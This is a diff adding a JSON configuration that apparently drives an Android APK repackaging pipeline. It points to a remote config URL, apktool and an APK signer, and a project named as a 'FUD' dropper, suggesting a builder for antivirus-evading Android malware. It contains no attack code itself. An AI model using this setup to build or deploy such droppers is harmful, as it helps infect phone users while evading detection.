@@ -1,0 +1,14 @@
+{
+  "config_host_url": "https://chauminbaba389-byte.github.io/encryption/config.json",
+  "google_services_json": "server-emcryption-main/google-services (43).json",
+  "input_dir": "input",
+  "output_dir": "output",
+  "work_dir": "work",
+  "droper_project": "server-emcryption-main/server-fud-main",
+  "tools": {
+    "apktool": "../0cursor/tools/apktool.jar",
+    "signer": "../0cursor/tools/uber-apk-signer.jar"
+  },
+  "java_home": "C:/Program Files/Eclipse Adoptium/jdk-17.0.17.10-hotspot",
+  "android_sdk": "%LOCALAPPDATA%/Android/Sdk"
+}
